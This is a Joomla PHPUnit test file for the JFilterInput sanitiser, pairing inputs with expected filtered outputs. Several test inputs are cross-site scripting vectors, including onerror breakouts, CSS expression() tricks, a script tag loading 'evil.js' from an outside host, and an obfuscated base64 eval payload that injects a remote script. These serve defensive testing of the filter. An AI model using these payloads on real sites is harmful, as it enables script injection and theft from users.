<?php
/**
 * @package     Joomla.UnitTest
 * @subpackage  Filter
 *
 * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE
 */

require_once JPATH_PLATFORM . '/joomla/filter/input.php';

/**
 * JFilterInputTest
 *
 * @package     Joomla.UnitTest
 * @subpackage  Filter
 *
 * @since       11.1
 */
class JFilterInputTest extends PHPUnit_Framework_TestCase
{
	/**
	 * Produces the array of test cases common to all test runs.
	 *
	 * @return array Two dimensional array of test cases. Each row consists of three values
	 *                The first is the type of input data, the second is the actual input data,
	 *                the third is the expected result of filtering, and the fourth is
	 *                the failure message identifying the source of the data.
	 *
	 * @return array
	 */
	public function casesGeneric()
	{
		$input = '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`' .
			'abcdefghijklmnopqrstuvwxyz{|}~â‚¬â€šÆ’â€žâ€¦â€ â€¡Ë†â€°Å â€¹Å’Å½â€˜â€™â€œâ' .
			'€�â€¢â€“â€”Ëœâ„¢Å¡â€ºÅ“Å¾Å¸Â¡Â¢Â£Â¤Â¥Â' .
			'¦Â§Â¨Â©ÂªÂ«Â¬Â­Â®Â¯Â°Â±Â²Â³Â´ÂµÂ¶Â·' .
			'Â¸Â¹ÂºÂ»Â¼Â½Â¾Â¿Ã€Ã�Ã‚ÃƒÃ„Ã…Ã†Ã‡ÃˆÃ‰ÃŠÃ‹' .
			'ÃŒÃ�ÃŽÃ�Ã�Ã‘Ã’Ã“Ã”Ã•Ã–Ã—Ã˜Ã™ÃšÃ›ÃœÃ�ÃžÃ' .
			'ŸÃ Ã¡Ã¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯Ã' .
			'°Ã±Ã²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹ÃºÃ»Ã¼Ã½Ã¾Ã¿';

		return array(
			'int_01' => array(
				'int',
				$input,
				123456789,
				'From generic cases'
			),
			'integer' => array(
				'int',
				$input,
				123456789,
				'From generic cases'
			),
			'int_02' => array(
				'int',
				'abc123456789abc123456789',
				123456789,
				'From generic cases'
			),
			'int_03' => array(
				'int',
				'123456789abc123456789abc',
				123456789,
				'From generic cases'
			),
			'int_04' => array(
				'int',
				'empty',
				0,
				'From generic cases'
			),
			'int_05' => array(
				'int',
				'ab-123ab',
				-123,
				'From generic cases'
			),
			'int_06' => array(
				'int',
				'-ab123ab',
				123,
				'From generic cases'
			),
			'int_07' => array(
				'int',
				'-ab123.456ab',
				123,
				'From generic cases'
			),
			'int_08' => array(
				'int',
				'456',
				456,
				'From generic cases'
			),
			'int_09' => array(
				'int',
				'-789',
				-789,
				'From generic cases'
			),
			'int_10' => array(
				'int',
				-789,
				-789,
				'From generic cases'
			),
			'uint_1' => array(
				'uint',
				-789,
				789,
				'From generic cases'
			),
			'float_01' => array(
				'float',
				$input,
				123456789,
				'From generic cases'
			),
			'double' => array(
				'double',
				$input,
				123456789,
				'From generic cases'
			),
			'float_02' => array(
				'float',
				20.20,
				20.2,
				'From generic cases'
			),
			'float_03' => array(
				'float',
				'-38.123',
				-38.123,
				'From generic cases'
			),
			'float_04' => array(
				'float',
				'abc-12.456',
				-12.456,
				'From generic cases'
			),
			'float_05' => array(
				'float',
				'-abc12.456',
				12.456,
				'From generic cases'
			),
			'float_06' => array(
				'float',
				'abc-12.456abc',
				-12.456,
				'From generic cases'
			),
			'float_07' => array(
				'float',
				'abc-12 . 456',
				-12,
				'From generic cases'
			),
			'float_08' => array(
				'float',
				'abc-12. 456',
				-12,
				'From generic cases'
			),
			'bool_0' => array(
				'bool',
				$input,
				true,
				'From generic cases'
			),
			'boolean' => array(
				'boolean',
				$input,
				true,
				'From generic cases'
			),
			'bool_1' => array(
				'bool',
				true,
				true,
				'From generic cases'
			),
			'bool_2' => array(
				'bool',
				false,
				false,
				'From generic cases'
			),
			'bool_3' => array(
				'bool',
				'',
				false,
				'From generic cases'
			),
			'bool_4' => array(
				'bool',
				0,
				false,
				'From generic cases'
			),
			'bool_5' => array(
				'bool',
				1,
				true,
				'From generic cases'
			),
			'bool_6' => array(
				'bool',
				null,
				false,
				'From generic cases'
			),
			'bool_7' => array(
				'bool',
				'false',
				true,
				'From generic cases'
			),
			'word_01' => array(
				'word',
				$input,
				'ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz',
				'From generic cases'
			),
			'word_02' => array(
				'word',
				null,
				'',
				'From generic cases'
			),
			'word_03' => array(
				'word',
				123456789,
				'',
				'From generic cases'
			),
			'word_04' => array(
				'word',
				'word123456789',
				'word',
				'From generic cases'
			),
			'word_05' => array(
				'word',
				'123456789word',
				'word',
				'From generic cases'
			),
			'word_06' => array(
				'word',
				'w123o4567r89d',
				'word',
				'From generic cases'
			),
			'alnum_01' => array(
				'alnum',
				$input,
				'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
				'From generic cases'
			),
			'alnum_02' => array(
				'alnum',
				null,
				'',
				'From generic cases'
			),
			'alnum_03' => array(
				'alnum',
				'~!@#$%^&*()_+abc',
				'abc',
				'From generic cases'
			),
			'cmd' => array(
				'cmd',
				$input,
				'-.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz',
				'From generic cases'
			),
			'base64' => array(
				'base64',
				$input,
				'+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
				'From generic cases'
			),
			'array' => array(
				'array',
				array(1, 3, 6),
				array(1, 3, 6),
				'From generic cases'
			),
			'path_01' => array(
				'path',
				'images/system',
				'images/system',
				'From generic cases'
			),
			'path_02' => array(
				'path',
				'http://www.fred.com/josephus',
				'',
				'From generic cases'
			),
			'user_01' => array(
				'username',
				'&<f>r%e\'d',
				'fred',
				'From generic cases'
			),
			'user_02' => array(
				'username',
				'fred',
				'fred',
				'From generic cases'
			),
			'string_01' => array(
				'string',
				'123.567',
				'123.567',
				'From generic cases'
			),
			'string_single_quote' => array(
				'string',
				"this is a 'test' of ?",
				"this is a 'test' of ?",
				'From generic cases'
			),
			'string_double_quote' => array(
				'string',
				'this is a "test" of "double" quotes',
				'this is a "test" of "double" quotes',
				'From generic cases'
			),
			'string_odd_double_quote' => array(
				'string',
				'this is a "test of "odd number" of quotes',
				'this is a "test of "odd number" of quotes',
				'From generic cases'
			),
			'string_odd_mixed_quote' => array(
				'string',
				'this is a "test\' of "odd number" of quotes',
				'this is a "test\' of "odd number" of quotes',
				'From generic cases'
			),
			'unknown_01' => array(
				'',
				'123.567',
				'123.567',
				'From generic cases'
			),
			'unknown_02' => array(
				'',
				array(1, 3, 9),
				array(1, 3, 9),
				'From generic cases'
			),
			'unknown_03' => array(
				'',
				array("key" => "Value", "key2" => "This&That", "key2" => "This&amp;That"),
				array("key" => "Value", "key2" => "This&That", "key2" => "This&That"),
				'From generic cases'
			),
			'unknown_04' => array(
				'',
				12.6,
				12.6,
				'From generic cases'
			),
			'tag_01' => array(
				'',
				'<em',
				'em',
				'From generic cases'
			),
			'Kill script' => array(
				'',
				'<img src="javascript:alert();" />',
				'<img />',
				'From generic cases'
			),
			'Nested tags' => array(
				'',
				'<em><strong>Fred</strong></em>',
				'<em><strong>Fred</strong></em>',
				'From generic cases'
			),
			'Malformed Nested tags' => array(
				'',
				'<em><strongFred</strong></em>',
				'<em>strongFred</strong></em>',
				'From generic cases'
			),
			'Unquoted Attribute Without Space' => array(
				'',
				'<img height=300>',
				'<img height="300" />',
				'From generic cases'
			),
			'Unquoted Attribute' => array(
				'',
				'<img height=300 />',
				'<img height="300" />',
				'From generic cases'
			),
			'Single quoted Attribute' => array(
				'',
				'<img height=\'300\' />',
				'<img height="300" />',
				'From generic cases'
			),
			'Attribute is zero' => array(
				'',
				'<img height=0 />',
				'<img height="0" />',
				'From generic cases'
			),
			'Attribute value missing' => array(
				'',
				'<img height= />',
				'<img height="" />',
				'From generic cases'
			),
			'Attribute without =' => array(
				'',
				'<img height="300" ismap />',
				'<img height="300" />',
				'From generic cases'
			),
			'Bad Attribute Name' => array(
				'',
				'<br 3bb />',
				'<br />',
				'From generic cases'
			),
			'Bad Tag Name' => array(
				'',
				'<300 />',
				'',
				'From generic cases'
			),
			'tracker9725' => array(
				'string',
				'<img class="one two" />',
				'<img class="one two" />',
				'Test for recursion with single tags - From generic cases'
			),
			'missing_quote' => array(
				'string',
				'<img height="123 />',
				'img height="123 /&gt;"',
				'From generic cases'
			),
		);
	}

	/**
	 * Produces the array of test cases for the Clean Text test run.
	 *
	 * @return array Two dimensional array of test cases. Each row consists of two values
	 *                The first is the input data for the test run,
	 *                and the second is the expected result of filtering.
	 */
	public function casesCleanText()
	{
		$cases = array(
			'case_1' => array(
				'',
				''
			),
			'script_0' => array(
				'<script>alert(\'hi!\');</script>',
				''
			)
		);
		$tests = $cases;

		return $tests;
	}

	/**
	 * Execute a cleanText test case.
	 *
	 * @param   string  $data    The original output
	 * @param   string  $expect  The expected result for this test.
	 *
	 * @return void
	 *
	 * @dataProvider casesCleanText
	 */
	public function testCleanText($data, $expect)
	{
		$this->markTestSkipped('Why are we calling JFilterOutput in JFilterInputTest?');
		$this->assertThat(
			$expect,
			$this->equalTo(JFilterOutput::cleanText($data))
		);
	}

	/**
	 * Produces the array of test cases for plain Whitelist test run.
	 *
	 * @return array Two dimensional array of test cases. Each row consists of three values
	 *                The first is the type of input data, the second is the actual input data,
	 *                the third is the expected result of filtering, and the fourth is
	 *                the failure message identifying the source of the data.
	 *
	 * @return array
	 */
	public function whitelist()
	{
		$casesSpecific = array(
			'Kill script' => array(
				'',
				'<img src="javascript:alert();" />',
				'',
				'From specific cases'
			),
			'Nested tags' => array(
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases'
			),
			'Malformed Nested tags' => array(
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases'
			),
			'Unquoted Attribute Without Space' => array(
				'',
				'<img height=300>',
				'',
				'From specific cases'
			),
			'Unquoted Attribute' => array(
				'',
				'<img height=300 />',
				'',
				'From specific cases'
			),
			'Single quoted Attribute' => array(
				'',
				'<img height=\'300\' />',
				'',
				'From specific cases'
			),
			'Attribute is zero' => array(
				'',
				'<img height=0 />',
				'',
				'From specific cases'
			),
			'Attribute value missing' => array(
				'',
				'<img height= />',
				'',
				'From specific cases'
			),
			'Attribute without =' => array(
				'',
				'<img height="300" ismap />',
				'',
				'From specific cases'
			),
			'Bad Attribute Name' => array(
				'',
				'<br 300 />',
				'',
				'From specific cases'
			),
			'tracker9725' => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'',
				'From specific cases'
			),
			'tracker24258' => array(
				// Test for recursion on attributes
				'string',
				'<scrip &nbsp; t>alert(\'test\');</scrip t>',
				'alert(\'test\');',
				'From generic cases'
			),
		);
		$tests = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case on clean() called as member with default filter settings (whitelist - no html).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying source of test case.
	 *
	 * @return void
	 *
	 * @dataProvider whitelist
	 */
	public function testCleanByCallingMember($type, $data, $expect, $message)
	{
		$filter = new JFilterInput;
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the Whitelist img tag test run.
	 *
	 * @return array Two dimensional array of test cases. Each row consists of three values
	 *                The first is the type of input data, the second is the actual input data,
	 *                the third is the expected result of filtering, and the fourth is
	 *                the failure message identifying the source of the data.
	 *
	 * @return array
	 */
	public function whitelistImg()
	{
		$security20110329bString = "<img src='<img src='/onerror=eval" .
			"(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3J" .
			"jJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=/.source))//'/> ";

		$casesSpecific = array(
			'Kill script' => array(
				'',
				'<img src="javascript:alert();" />',
				'<img />',
				'From specific cases'
			),
			'Nested tags' => array(
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases'
			),
			'Malformed Nested tags' => array(
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases'
			),
			'Unquoted Attribute Without Space' => array(
				'',
				'<img height=300>',
				'<img />',
				'From specific cases'
			),
			'Unquoted Attribute' => array(
				'',
				'<img height=300 />',
				'<img />',
				'From specific cases'
			),
			'Single quoted Attribute' => array(
				'',
				'<img height=\'300\' />',
				'<img />',
				'From specific cases'
			),
			'Attribute is zero' => array(
				'',
				'<img height=0 />',
				'<img />',
				'From specific cases'
			),
			'Attribute value missing' => array(
				'',
				'<img height= />',
				'<img />',
				'From specific cases'
			),
			'Attribute without =' => array(
				'',
				'<img height="300" ismap />',
				'<img />',
				'From specific cases'
			),
			'Bad Attribute Name' => array(
				'',
				'<br 300 />',
				'',
				'From specific cases'
			),
			'tracker9725' => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'<img />',
				'From specific cases'
			),
			'security_20110329a' => array(
				'string',
				"<img src='<img src='///'/> ",
				'<img /> ',
				'From specific cases'
			),
			'security_20110329b' => array(
				'string',
				$security20110329bString,
				'<img /> ',
				'From specific cases'
			),
			'hanging_quote' => array(
				'string',
				"<img src=\' />",
				'<img />',
				'From specific cases'
			),
			'hanging_quote2' => array(
				'string',
				'<img src slkdjls " this is "more " stuff',
				'img src slkdjls " this is "more " stuff',
				'From specific cases'
			),
			'hanging_quote3' => array(
				'string',
				"<img src=\"\'\" />",
				'<img />',
				'From specific cases'
			),
		);
		$tests = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case on clean() called as member with custom filter settings (whitelist).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return void
	 *
	 * @dataProvider whitelistImg
	 */
	public function testCleanWithImgWhitelisted($type, $data, $expect, $message)
	{
		$filter = JFilterInput::getInstance(array('img'), null, 0, 0);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the Whitelist class attribute test run.
	 *
	 * @return array Two dimensional array of test cases. Each row consists of three values
	 *                The first is the type of input data, the second is the actual input data,
	 *                the third is the expected result of filtering, and the fourth is
	 *                the failure message identifying the source of the data.
	 *
	 * @return array
	 */
	public function whitelistClass()
	{
		$casesSpecific = array(
			'Kill script' => array(
				'',
				'<img src="javascript:alert();" />',
				'',
				'From specific cases'
			),
			'Nested tags' => array(
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases'
			),
			'Malformed Nested tags' => array(
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases'
			),
			'Unquoted Attribute Without Space' => array(
				'',
				'<img height=300>',
				'',
				'From specific cases'
			),
			'Unquoted Attribute' => array(
				'',
				'<img height=300 />',
				'',
				'From specific cases'
			),
			'Single quoted Attribute' => array(
				'',
				'<img height=\'300\' />',
				'',
				'From specific cases'
			),
			'Attribute is zero' => array(
				'',
				'<img height=0 />',
				'',
				'From specific cases'
			),
			'Attribute value missing' => array(
				'',
				'<img height= />',
				'',
				'From specific cases'
			),
			'Attribute without =' => array(
				'',
				'<img height="300" ismap />',
				'',
				'From specific cases'
			),
			'Bad Attribute Name' => array(
				'',
				'<br 300 />',
				'',
				'From specific cases'
			),
			'tracker9725' => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'',
				'From specific cases'
			)
		);
		$tests = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case on clean() called as member with custom filter settings (whitelist).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return void
	 *
	 * @dataProvider whitelistClass
	 */
	public function testCleanWithClassWhitelisted($type, $data, $expect, $message)
	{
		$filter = JFilterInput::getInstance(null, array('class'), 0, 0);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the Whitelist class attribute img tag test run.
	 *
	 * @return array Two dimensional array of test cases. Each row consists of three values
	 *                The first is the type of input data, the second is the actual input data,
	 *                the third is the expected result of filtering, and the fourth is
	 *                the failure message identifying the source of the data.
	 *
	 * @return array
	 */
	public function whitelistClassImg()
	{
		$casesSpecific = array(
			'Kill script' => array(
				'',
				'<img src="javascript:alert();" />',
				'<img />',
				'From specific cases'
			),
			'Nested tags' => array(
				'',
				'<em><strong>Fred</strong></em>',
				'Fred',
				'From specific cases'
			),
			'Malformed Nested tags' => array(
				'',
				'<em><strongFred</strong></em>',
				'strongFred',
				'From specific cases'
			),
			'Unquoted Attribute Without Space' => array(
				'',
				'<img class=myclass height=300 >',
				'<img class="myclass" />',
				'From specific cases'
			),
			'Unquoted Attribute' => array(
				'',
				'<img class = myclass  height = 300/>',
				'<img />',
				'From specific cases'
			),
			'Single quoted Attribute' => array(
				'',
				'<img class=\'myclass\' height=\'300\' />',
				'<img class="myclass" />',
				'From specific cases'
			),
			'Attribute is zero' => array(
				'',
				'<img class=0 height=0 />',
				'<img class="0" />',
				'From specific cases'
			),
			'Attribute value missing' => array(
				'',
				'<img class= height= />',
				'<img class="" />',
				'From specific cases'
			),
			'Attribute without =' => array(
				'',
				'<img ismap class />',
				'<img />',
				'From specific cases'
			),
			'Bad Attribute Name' => array(
				'',
				'<br 300 />',
				'',
				'From specific cases'
			),
			'tracker9725' => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'<img class="one two" />',
				'From specific cases'
			),
			'class with no =' => array(
				// Test for recursion with single tags
				'string',
				'<img class />',
				'<img />',
				'From specific cases'
			),
		);
		$tests = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case on clean() called as member with custom filter settings (whitelist).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return void
	 *
	 * @dataProvider whitelistClassImg
	 */
	public function testCleanWithImgAndClassWhitelisted($type, $data, $expect, $message)
	{
		$filter = JFilterInput::getInstance(array('img'), array('class'), 0, 0);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the plain Blacklist test run.
	 *
	 * @return array Two dimensional array of test cases. Each row consists of three values
	 *                The first is the type of input data, the second is the actual input data,
	 *                the third is the expected result of filtering, and the fourth is
	 *                the failure message identifying the source of the data.
	 *
	 * @return array
	 */
	public function blacklist()
	{
		$quotesInText1 = '<p class="my_class">This is a = "test" ' .
			'<a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>';
		$quotesInText2 = '<p class="my_class">This is a = "test" ' .
			'<a href="http://mysite.com" img="my_image">link test</a>. This is some more text.</p>';
		$normalNested1 = '<p class="my_class">This is a <a href="http://mysite.com" img = "my_image">link test</a>.' .
			' This is <span class="myclass" font = "myfont" > some more</span> text.</p>';
		$normalNested2 = '<p class="my_class">This is a <a href="http://mysite.com" img="my_image">link test</a>. ' .
			'This is <span class="myclass" font="myfont"> some more</span> text.</p>';

		$casesSpecific = array(
			'security_tracker_24802_a' => array(
				'',
				'<img src="<img src=x"/onerror=alert(1)//">',
				'<img src="&lt;img src=x&quot;/onerror=alert(1)//" />',
				'From specific cases'
			),
			'security_tracker_24802_b' => array(
				'',
				'<img src="<img src=x"/onerror=alert(1)"//>"',
				'img src="&lt;img src=x&quot;/onerror=alert(1)&quot;//&gt;"',
				'From specific cases'
			),
			'security_tracker_24802_c' => array(
				'',
				'<img src="<img src=x"/onerror=alert(1)"//>',
				'img src="&lt;img src=x&quot;/onerror=alert(1)&quot;//&gt;"',
				'From specific cases'
			),
			'security_tracker_24802_d' => array(
				'',
				'<img src="x"/onerror=alert(1)//">',
				'<img src="x&quot;/onerror=alert(1)//" />',
				'From specific cases'
			),
			'security_tracker_24802_e' => array(
				'',
				'<img src=<img src=x"/onerror=alert(1)//">',
				'img src=<img src="x/onerror=alert(1)//" />',
				'From specific cases'
			),
			'empty_alt' => array(
				'string',
				'<img alt="" src="my_source" />',
				'<img alt="" src="my_source" />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_a' => array(
				'string',
				'<img disabled src="my_source" />',
				'<img src="my_source" />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_b' => array(
				'string',
				'<img alt="" disabled src="aaa" />',
				'<img alt="" src="aaa" />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_c' => array(
				'string',
				'<img disabled />',
				'<img />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_d' => array(
				'string',
				'<img height="300" disabled />',
				'<img height="300" />',
				'Test empty alt attribute'
			),
			'disabled_no_equals_e' => array(
				'string',
				'<img height disabled />',
				'<img />',
				'Test empty alt attribute'
			),
			'test_nested' => array(
				'string',
				'<img src="<img src=x"/onerror=alert(1)//>" />',
				'<img src="&lt;img src=x&quot;/onerror=alert(1)//&gt;" />',
				'Test empty alt attribute'
			),
			'infinte_loop_a' => array(
				'string',
				'<img src="x" height = "zzz" />',
				'<img src="x" height="zzz" />',
				'Test empty alt attribute'
			),
			'infinte_loop_b' => array(
				'string',
				'<img src = "xxx" height = "zzz" />',
				'<img src="xxx" height="zzz" />',
				'Test empty alt attribute'
			),
			'quotes_in_text' => array(
				'string',
				$quotesInText1,
				$quotesInText2,
				'Test valid nested tag'
			),
			'normal_nested' => array(
				'string',
				$normalNested1,
				$normalNested2,
				'Test valid nested tag'
			),
			'hanging_quote' => array(
				'string',
				"<img src=\' />",
				'<img src="" />',
				'From specific cases'
			),
			'hanging_quote2' => array(
				'string',
				'<img src slkdjls " this is "more " stuff',
				'img src slkdjls " this is "more " stuff',
				'From specific cases'
			),
			'hanging_quote3' => array(
				'string',
				"<img src=\"\' />",
				'img src="\\\' /&gt;"',
				'From specific cases'
			),
			'tracker25558a' => array(
				'string',
				'<SCRIPT SRC=http://jeffchannell.com/evil.js#<B />',
				'SCRIPT SRC=http://jeffchannell.com/evil.js#<B />',
				'Test mal-formed element from 25558a'
			),
			'tracker25558b' => array(
				'string',
				'<IMG STYLE="xss:expression(alert(\'XSS\'))" />',
				'<IMG STYLE="xss(alert(\'XSS\'))" />',
				'Test mal-formed element from 25558b'
			),
			'tracker25558c' => array(
				'string',
				'<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))" />',
				'<IMG STYLE="xss(alert(\'XSS\'))" />',
				'Test mal-formed element from 25558b'
			),
			'tracker25558d' => array(
				'string',
				'<IMG STYLE="xss:expr/*XSS*/ess/*another comment*/ion(alert(\'XSS\'))" />',
				'<IMG STYLE="xss(alert(\'XSS\'))" />',
				'Test mal-formed element from 25558b'
			),
			'tracker25558e' => array(
				'string',
				'<b><script<b></b><alert(1)</script </b>',
				'<b>script<b></b>alert(1)/script</b>',
				'Test mal-formed element from 25558e'
			),
			'security_20110329a' => array(
				'string',
				"<img src='<img src='///'/> ",
				"<img src=\"'&lt;img\" src=\"'///'/\" /> ",
				'From specific cases'
			),
			'html_01' => array(
				'html',
				'<div>Hello</div>',
				'<div>Hello</div>',
				'Generic test case for HTML cleaning'
			),
			'tracker26439a' => array(
				'string',
				'<p>equals quote =" inside valid tag</p>',
				'<p>equals quote =" inside valid tag</p>',
				'Test quote equals inside valid tag'
			),
			'tracker26439b' => array(
				'string',
				"<p>equals quote =' inside valid tag</p>",
				"<p>equals quote =' inside valid tag</p>",
				'Test single quote equals inside valid tag'
			),
		);
		$tests = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case with clean() default blacklist filter settings (strips bad tags).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return void
	 *
	 * @dataProvider blacklist
	 */
	public function testCleanWithDefaultBlackList($type, $data, $expect, $message)
	{
		$filter = JFilterInput::getInstance(null, null, 1, 1);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the Blacklist img tag test run.
	 *
	 * @return array Two dimensional array of test cases. Each row consists of three values
	 *                The first is the type of input data, the second is the actual input data,
	 *                the third is the expected result of filtering, and the fourth is
	 *                the failure message identifying the source of the data.
	 *
	 * @return array
	 */
	public function blacklistImg()
	{
		$security20110328String = "<img src='<img src='/onerror=" .
			"eval(atob(/KGZ1bmN0aW9uKCl7dHJ5e3ZhciBkPWRvY3VtZW50LGI9ZC5ib2R5LHM9ZC5jcmVhdGVFbGV" .
			"tZW50KCdzY3JpcHQnKTtzLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cDovL2hhLmNrZXJzLm9yZy94c3MuanMnKTtiLmFwcGVuZENoaWxkKHMpO31jYXRjaChlKXt9fSkoKTs=" .
			"/.source))//'/> ";

		$casesSpecific = array(
			'Kill script' => array(
				'',
				'<img src="javascript:alert();" />',
				'',
				'From specific cases'
			),
			'Unquoted Attribute Without Space' => array(
				'',
				'<img height=300>',
				'',
				'From specific cases'
			),
			'Unquoted Attribute' => array(
				'',
				'<img height=300 />',
				'',
				'From specific cases'
			),
			'Single quoted Attribute' => array(
				'',
				'<img height=\'300\' />',
				'',
				'From specific cases'
			),
			'Attribute is zero' => array(
				'',
				'<img height=0 />',
				'',
				'From specific cases'
			),
			'Attribute value missing' => array(
				'',
				'<img height= />',
				'',
				'From specific cases'
			),
			'Attribute without =' => array(
				'',
				'<img height="300" ismap />',
				'',
				'From specific cases'
			),
			'tracker9725' => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'',
				'From specific cases'
			),
			'security_20110328' => array(
				'string',
				$security20110328String,
				' ',
				'From specific cases'
			),
		);
		$tests = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case with clean() using custom img blacklist filter settings (strips bad tags).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return void
	 *
	 * @dataProvider blacklistImg
	 */
	public function testCleanWithImgBlackList($type, $data, $expect, $message)
	{
		$filter = JFilterInput::getInstance(array('img'), null, 1, 1);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Produces the array of test cases for the Blacklist class attribute test run.
	 *
	 * @return array Two dimensional array of test cases. Each row consists of three values
	 *                The first is the type of input data, the second is the actual input data,
	 *                the third is the expected result of filtering, and the fourth is
	 *                the failure message identifying the source of the data.
	 *
	 * @return array
	 */
	public function blacklistClass()
	{
		$casesSpecific = array(
			'tracker9725' => array(
				// Test for recursion with single tags
				'string',
				'<img class="one two" />',
				'<img />',
				'From specific cases'
			)
		);
		$tests = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case with clean() using custom class blacklist filter settings (strips bad tags).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return void
	 *
	 * @dataProvider blacklistClass
	 */
	public function testCleanWithClassBlackList($type, $data, $expect, $message)
	{
		$filter = JFilterInput::getInstance(null, array('class'), 1, 1);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}
}
